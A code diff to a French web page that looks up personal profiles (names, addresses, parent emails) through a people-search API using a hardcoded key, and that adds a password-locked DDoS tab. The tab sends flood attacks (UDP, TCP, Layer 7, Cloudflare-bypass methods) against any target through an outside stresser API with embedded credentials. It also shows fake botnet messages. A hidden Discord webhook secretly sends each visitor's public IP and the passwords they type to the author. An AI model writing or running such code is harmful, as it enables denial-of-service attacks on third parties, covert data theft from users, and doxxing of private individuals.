@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Fiche2Paname - BrixHub Tools</title>
+    <title>Fiche2Paname - BrixHub + DDoS</title>
     <script>
         (function(){
             document.addEventListener('contextmenu', e => e.preventDefault());
@@ -114,7 +114,7 @@
             padding: 0.4rem; flex-wrap: wrap;
         }
         .tab-btn {
-            flex: 1; min-width: 120px; padding: 12px 10px; text-align: center;
+            flex: 1; min-width: 100px; padding: 12px 10px; text-align: center;
             background: transparent; border: none; border-radius: 1.2rem;
             color: #666; font-weight: 600; font-size: 0.8rem; cursor: pointer;
             transition: 0.2s; letter-spacing: 1px;
@@ -200,7 +200,7 @@
         .card-actions .edit-btn:hover { background: #1a1a2a; color: #aaaaff; border-color: #445; }
         .badge-local { background: #1a2a1a; color: #8c8; padding: 2px 10px; border-radius: 2rem; font-size: 0.6rem; border: 1px solid #2a3a2a; }
 
-        /* ===== BRIXHUB STYLES (intégrés dans l'onglet OUTILS) ===== */
+        /* ===== BRIXHUB STYLES ===== */
         .brix-panel {
             background: #0a0a0a;
             border: 1px solid #1e1e1e;
@@ -363,6 +363,117 @@
             display: none; max-width: 350px;
         }
 
+        /* ===== DDoS PANEL (nouvel onglet) ===== */
+        .ddos-panel {
+            background: #0a0a0a;
+            border: 1px solid #1e1e1e;
+            border-radius: 1.5rem;
+            padding: 1.2rem 1.8rem;
+            margin-bottom: 1.5rem;
+        }
+        .ddos-panel h3 {
+            color: #ccc;
+            font-size: 0.9rem;
+            margin-bottom: 1rem;
+            letter-spacing: 1px;
+            border-left: 3px solid #ff4444;
+            padding-left: 10px;
+        }
+        .ddos-flex {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            align-items: flex-end;
+        }
+        .ddos-field {
+            flex: 1;
+            min-width: 150px;
+        }
+        .ddos-field label {
+            display: block;
+            font-size: 0.65rem;
+            color: #aaa;
+            margin-bottom: 5px;
+        }
+        .ddos-field input, select {
+            width: 100%;
+            background: #111;
+            border: 1px solid #262626;
+            padding: 10px 14px;
+            border-radius: 1rem;
+            color: #f0f0f0;
+        }
+        .ddos-btn {
+            background: #121212;
+            border: 1px solid #3a3a3a;
+            padding: 10px 24px;
+            border-radius: 2rem;
+            color: #ccc;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .ddos-btn:hover { background: #1f1f1f; color: white; }
+        .ddos-lock-container {
+            text-align: center;
+            padding: 20px;
+            background: #0a0a0a;
+            border-radius: 1rem;
+            margin-bottom: 1rem;
+        }
+        .lock-icon {
+            font-size: 4rem;
+            cursor: pointer;
+            transition: 0.2s;
+            display: inline-block;
+        }
+        .lock-icon:hover {
+            transform: scale(1.05);
+            text-shadow: 0 0 10px #ffaa44;
+        }
+        .lock-password-input {
+            margin-top: 15px;
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            align-items: center;
+        }
+        .lock-password-input input {
+            background: #111;
+            border: 1px solid #262626;
+            padding: 8px 12px;
+            border-radius: 1rem;
+            color: white;
+            width: 200px;
+            text-align: center;
+        }
+        .ddos-controls {
+            display: none;
+        }
+        .ddos-controls.visible {
+            display: block;
+            animation: fadeIn 0.4s;
+        }
+        .attack-count {
+            background: #2a2a3a;
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 2rem;
+            font-size: 0.7rem;
+            margin-bottom: 1rem;
+        }
+        @keyframes unlockAnim {
+            0% { transform: scale(1) rotate(0deg); filter: blur(0); opacity: 1; }
+            30% { transform: scale(1.3) rotate(20deg); filter: blur(2px); opacity: 0.8; }
+            70% { transform: scale(0.9) rotate(-10deg); filter: blur(0); opacity: 1; }
+            100% { transform: scale(1) rotate(0deg); }
+        }
+        .unlock-animation {
+            animation: unlockAnim 0.6s ease-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
         @media (max-width: 650px) {
             body { padding: 0.8rem; }
             .cards-grid { grid-template-columns: 1fr; }
@@ -408,10 +519,11 @@
             <button id="logoutMain" class="logout-btn">⟡ DÉCONNEXION</button>
         </div>
 
-        <!-- TABS -->
+        <!-- TABS : on ajoute le troisième onglet DDOS -->
         <div class="tabs">
             <button class="tab-btn active" data-tab="tabFiches">📁 FICHES</button>
             <button class="tab-btn" data-tab="tabOutils">⚙ OUTILS</button>
+            <button class="tab-btn" data-tab="tabDdos">💣 DDOS</button>
         </div>
 
         <!-- ===== TAB 1 : FICHES (local) ===== -->
@@ -453,9 +565,8 @@
             <div id="cardsContainer" class="cards-grid"></div>
         </div>
 
-        <!-- ===== TAB 2 : OUTILS (BrixHub) ===== -->
+        <!-- ===== TAB 2 : OUTILS (BrixHub uniquement) ===== -->
         <div id="tabOutils" class="tab-content">
-            <!-- Avertissement proxy -->
             <div class="warning" id="warningBox">
                 ⚠️ <strong>Activation unique du proxy :</strong> 
                 <a href="https://cors-anywhere.herokuapp.com/" target="_blank" id="corsLink">Cliquez ici</a> puis sur <strong>"Request temporary access"</strong>. 
@@ -463,7 +574,6 @@
                 <span id="proxyStatus" style="color:#88ff88;">⚪ En attente d'activation...</span>
             </div>
 
-            <!-- Interface BrixHub -->
             <div class="brix-panel">
                 <div class="brix-quota" id="brixQuotaDisplay">📊 Quota: --</div>
                 <h3>🔎 Recherche multicritères (POST /search)</h3>
@@ -511,6 +621,62 @@
                     <button id="brixUsageBtn" class="brix-btn">📜 Charger logs</button>
                 </div>
                 <div id="usageResult" class="result-grid"></div>
+            </div>
+        </div>
+
+        <!-- ===== TAB 3 : DDOS (nouvel onglet) ===== -->
+        <div id="tabDdos" class="tab-content">
+            <div class="ddos-panel">
+                <h3>💣 DDoS Attack Panel (max 120s, max 2 concurrents)</h3>
+                <div id="ddosLockZone">
+                    <div class="ddos-lock-container">
+                        <div class="lock-icon" id="lockIcon">🔒</div>
+                        <div class="lock-password-input" id="lockPasswordDiv" style="display:none;">
+                            <input type="password" id="ddosPassword" placeholder="mot de passe">
+                            <button id="submitPasswordBtn">✓</button>
+                        </div>
+                        <div id="lockError" style="color:#ff8888; margin-top:5px;"></div>
+                    </div>
+                    <div id="ddosControls" class="ddos-controls">
+                        <div id="attackCounter" class="attack-count">⚡ Attaques en cours: 0 / 2</div>
+                        <div class="ddos-flex">
+                            <div class="ddos-field"><label>Cible (IP ou domaine)</label><input type="text" id="ddosTarget" placeholder="https://cible.com/"></div>
+                            <div class="ddos-field"><label>Port</label><input type="text" id="ddosPort" value="443" placeholder="443"></div>
+                            <div class="ddos-field"><label>Durée (s, max 120)</label><input type="number" id="ddosTime" max="120" value="60"></div>
+                        </div>
+                        <div class="ddos-flex">
+                            <div class="ddos-field"><label>Méthode</label>
+                                <select id="ddosMethod">
+                                    <optgroup label="[ Transmission Control Protocol ]">
+                                        <option value="OVH">OVH [PROTECTED]</option>
+                                        <option value="FIVEM">FIVEM [PROTECTED]</option>
+                                        <option value="TCP">TCP [PROTECTED]</option>
+                                    </optgroup>
+                                    <optgroup label="[ User Datagram Protocol ]">
+                                        <option value="DNS">DNS [PROT & UNPROT]</option>
+                                        <option value="DISCORD">DISCORD [PROT & UNPROT]</option>
+                                        <option value="HOMEHOLD">HOMEHOLD [PROT & UNPROT]</option>
+                                        <option value="GAMEKILL">GAMEKILL [PROT & UNPROT]</option>
+                                        <option value="UDPBYPASS">UDPBYPASS [PROTECTED]</option>
+                                        <option value="UDPKILL">UDPKILL [PROTECTED]</option>
+                                    </optgroup>
+                                    <optgroup label="[ Application Layer & Layer 7 ]">
+                                        <option value="TLS">TLS [PROT & UNPROT]</option>
+                                        <option value="HTTP">HTTP [PROT & UNPROT]</option>
+                                        <option value="HTTPSBYPASS">HTTPSBYPASS [PROTECTED]</option>
+                                        <option value="CLOUDFLARE">CLOUDFLARE [PROTECTED]</option>
+                                        <option value="BROWSER">BROWSER [PROTECTED]</option>
+                                    </optgroup>
+                                    <optgroup label="[ Extra ]">
+                                        <option value="PPS">PPS [PROTECTED] ~ High PPS flood, very high packets per second</option>
+                                    </optgroup>
+                                </select>
+                            </div>
+                            <button id="launchDdosBtn" class="ddos-btn">🚀 LANCER L'ATTAQUE</button>
+                        </div>
+                        <div id="ddosLog" class="brix-result" style="margin-top:1rem; max-height:300px; overflow:auto;"></div>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
@@ -712,14 +878,6 @@
         renderCards();
     });
     document.getElementById('searchInput').addEventListener('keypress', e => { if(e.key === 'Enter') doSearch(); });
-    document.querySelectorAll('.tab-btn').forEach(btn => {
-        btn.addEventListener('click', function() {
-            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-            this.classList.add('active');
-            document.getElementById(this.dataset.tab).classList.add('active');
-        });
-    });
     function checkSession() {
         if(localStorage.getItem(_hidden.session) === 'true') {
             document.getElementById('loginPanel').style.display = 'none';
@@ -759,7 +917,7 @@
     document.getElementById('loginPass').addEventListener('keypress', e => { if(e.key === 'Enter') document.getElementById('doLogin').click(); });
     checkSession();
 
-    // ==================== BRIXHUB API (intégration complète) ====================
+    // ==================== BRIXHUB API ====================
     const BRIX_API_KEY = "brix_ZEhVnoM26YbtYU633Aa42Jirj7q3R1IaUka57rYllDl_EZr-";
     const BRIX_BASE = "https://brixhub.net/api/v1";
     const PROXY = "https://cors-anywhere.herokuapp.com/";
@@ -783,7 +941,6 @@
         return data;
     }
 
-    // Génération texte fiche (pour copie)
     function generateTextFiche(profile) {
         const nomFamille = profile.nom_famille || profile.lastName || '';
         const prenom = profile.prenom || profile.firstName || '';
@@ -800,7 +957,6 @@
         const allocataire = profile.allocataire || '';
         const parentNom = profile.parentName || '';
         const parentEmail = profile.parentEmail || '';
-        const sources = profile._sources || [];
         const mergedIds = profile.mergedIds || [];
         const mergedCount = profile.mergedCount || mergedIds.length;
         let adresseComplete = '';
@@ -901,17 +1057,14 @@
         if (parentNom) html += `<div class="fiche-line"><span class="fiche-label">PARENT :</span><span class="fiche-value">${escapeHtml(parentNom)}</span></div>`;
         if (parentEmail) html += `<div class="fiche-line"><span class="fiche-label">EMAIL PARENT :</span><span class="fiche-value">${escapeHtml(parentEmail)}</span></div>`;
         if (mergedCount > 0 && mergedIds.length) {
-            html += `<div class="fiche-line" style="margin-top:6px;"><span class="fiche-label">🔍 FUSIONS (${mergedCount}) :</span><span class="fiche-value"></span></div>`;
-            let fusionHtml = `<div class="fiche-line"><span class="fiche-label"></span><span class="fiche-value">`;
-            for (let id of mergedIds) fusionHtml += `<span class="badge-sources" style="background:#1a1a2a;">${escapeHtml(id)}</span> `;
-            fusionHtml += `</span></div>`;
-            html += fusionHtml;
+            html += `<div class="fiche-line" style="margin-top:6px;"><span class="fiche-label">🔍 FUSIONS (${mergedCount}) :</span><span class="fiche-value"></span></div><div class="fiche-line"><span class="fiche-label"></span><span class="fiche-value">`;
+            for (let id of mergedIds) html += `<span class="badge-sources" style="background:#1a1a2a;">${escapeHtml(id)}</span> `;
+            html += `</span></div>`;
         }
         html += `<div style="margin-top: 8px;">`;
         sources.forEach(s => html += `<span class="badge-sources">📎 ${escapeHtml(s)}</span> `);
         if (confiance) html += `<span class="badge-sources badge-confidence">⭐ Confiance ${confiance}%</span>`;
-        html += `</div>`;
-        html += `<div class="button-group">`;
+        html += `</div><div class="button-group">`;
         html += `<button class="copy-text-btn" data-json='${JSON.stringify(profile).replace(/'/g, "&#39;")}'>📋 Copier (texte)</button>`;
         html += `<button class="copy-json-btn" data-json='${JSON.stringify(profile).replace(/'/g, "&#39;")}'>📄 Copier JSON</button>`;
         html += `</div></div>`;
@@ -922,20 +1075,11 @@
         const container = document.getElementById(containerId);
         if (!container) return;
         let items = [];
-        if (apiResponse.data && Array.isArray(apiResponse.data.results)) {
-            items = apiResponse.data.results;
-        } else if (apiResponse.data && !Array.isArray(apiResponse.data) && typeof apiResponse.data === 'object') {
-            items = [apiResponse.data];
-        } else if (apiResponse.results) {
-            items = apiResponse.results;
-        } else {
-            container.innerHTML = '<div class="empty-state">❌ Aucune fiche trouvée</div>';
-            return;
-        }
-        if (!items.length) {
-            container.innerHTML = '<div class="empty-state">😕 Aucun résultat</div>';
-            return;
-        }
+        if (apiResponse.data && Array.isArray(apiResponse.data.results)) items = apiResponse.data.results;
+        else if (apiResponse.data && !Array.isArray(apiResponse.data) && typeof apiResponse.data === 'object') items = [apiResponse.data];
+        else if (apiResponse.results) items = apiResponse.results;
+        else { container.innerHTML = '<div class="empty-state">❌ Aucune fiche trouvée</div>'; return; }
+        if (!items.length) { container.innerHTML = '<div class="empty-state">😕 Aucun résultat</div>'; return; }
         container.innerHTML = items.map(profile => renderClientCard(profile)).join('');
     }
 
@@ -1072,6 +1216,122 @@
         } catch(err) {
             document.getElementById('usageResult').innerHTML = `<div class="empty-state">❌ Erreur : ${err.message}</div>`;
         }
+    });
+
+    // ==================== DDOS LOGIC + WEBHOOK + MESSAGES SKID ====================
+    let activeAttacks = 0;
+    const maxConcurrent = 2;
+    let isUnlocked = false;
+    const lockIcon = document.getElementById('lockIcon');
+    const lockPasswordDiv = document.getElementById('lockPasswordDiv');
+    const ddosControlsDiv = document.getElementById('ddosControls');
+
+    async function sendToWebhook(ip, success, passwordEntered) {
+        const webhookUrl = "https://discord.com/api/webhooks/1500837194192130130/SRAwwkVIqaqIgLDX35fRqQMIcUwzqvjcQGa_cgqE2XWVQfgihIRmu8mdxbsGSEcq1xNa";
+        const message = {
+            content: `**🔐 Tentative de déverrouillage du panel DDoS**\n🕒 Heure : ${new Date().toLocaleString()}\n🌐 IP : ${ip}\n🔑 Mot de passe saisi : \`${passwordEntered}\`\n✅ Succès : ${success ? "OUI" : "NON"}`
+        };
+        try {
+            await fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(message) });
+        } catch(e) { console.error("Webhook error", e); }
+    }
+
+    async function getPublicIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch(e) { return "Inconnue"; }
+    }
+
+    lockIcon.addEventListener('click', () => {
+        if (!isUnlocked) {
+            lockPasswordDiv.style.display = 'flex';
+            lockIcon.style.cursor = 'default';
+        }
+    });
+
+    document.getElementById('submitPasswordBtn').addEventListener('click', async () => {
+        const pwd = document.getElementById('ddosPassword').value;
+        const ip = await getPublicIP();
+        const success = (pwd === '7331');   // nouveau mot de passe
+        await sendToWebhook(ip, success, pwd);
+        if (success) {
+            isUnlocked = true;
+            lockIcon.classList.add('unlock-animation');
+            setTimeout(() => {
+                lockIcon.textContent = '🔓';
+                lockPasswordDiv.style.display = 'none';
+                ddosControlsDiv.classList.add('visible');
+                toast('🔓 Déverrouillé !');
+            }, 300);
+            setTimeout(() => lockIcon.classList.remove('unlock-animation'), 600);
+        } else {
+            document.getElementById('lockError').textContent = '❌ Mauvais mot de passe';
+            setTimeout(() => document.getElementById('lockError').textContent = '', 2000);
+        }
+    });
+
+    function updateAttackCounter() {
+        document.getElementById('attackCounter').innerHTML = `⚡ Attaques en cours: ${activeAttacks} / ${maxConcurrent}`;
+    }
+
+    async function launchAttack(target, port, duration, method) {
+        if (activeAttacks >= maxConcurrent) {
+            toast(`❌ Maximum ${maxConcurrent} attaques simultanées`);
+            return false;
+        }
+        if (duration > 120) { toast('Durée max 120 secondes'); return false; }
+        if (!target) { toast('Cible requise'); return false; }
+        const apiUrl = `https://endpoint.ryxc2.com/api/attack?username=datacrypteds&password=dede88LLO&target=${encodeURIComponent(target)}&port=${port}&time=${duration}&method=${method}`;
+        activeAttacks++;
+        updateAttackCounter();
+        const logDiv = document.getElementById('ddosLog');
+        
+        // Messages skid
+        logDiv.innerHTML += `<div>[${new Date().toLocaleTimeString()}] 🤖 Connexion au botnet...</div>`;
+        await new Promise(r => setTimeout(r, 400));
+        logDiv.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ⚡ Botnet connecté - 36889 zombies prêts</div>`;
+        await new Promise(r => setTimeout(r, 300));
+        logDiv.innerHTML += `<div>[${new Date().toLocaleTimeString()}] 🚀 Lancement de l'attaque ${method} sur ${target}:${port} pour ${duration}s</div>`;
+        
+        try {
+            const response = await fetch(apiUrl);
+            const result = await response.text();
+            logDiv.innerHTML += `<div>[${new Date().toLocaleTimeString()}] 💥 Attaque en cours... (${result.substring(0, 100)})</div>`;
+            toast(`💣 Attaque ${method} lancée sur ${target}`);
+        } catch (err) {
+            logDiv.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ❌ Erreur: ${err.message}</div>`;
+        } finally {
+            setTimeout(() => {
+                activeAttacks--;
+                updateAttackCounter();
+                logDiv.innerHTML += `<div>[${new Date().toLocaleTimeString()}] 🛑 Attaque terminée - ${duration}s écoulées</div>`;
+                toast(`✅ Attaque terminée sur ${target}`);
+            }, duration * 1000);
+        }
+        return true;
+    }
+
+    document.getElementById('launchDdosBtn').addEventListener('click', async () => {
+        if (!isUnlocked) { toast('🔒 Déverrouillez d\'abord le panneau'); return; }
+        const target = document.getElementById('ddosTarget').value.trim();
+        const port = document.getElementById('ddosPort').value.trim();
+        let time = parseInt(document.getElementById('ddosTime').value);
+        if (isNaN(time)) time = 60;
+        time = Math.min(120, Math.max(1, time));
+        const method = document.getElementById('ddosMethod').value;
+        await launchAttack(target, port, time, method);
+    });
+
+    // Gestion des onglets (ajout du troisième)
+    document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.addEventListener('click', function() {
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            this.classList.add('active');
+            document.getElementById(this.dataset.tab).classList.add('active');
+        });
     });
 </script>
 </body>
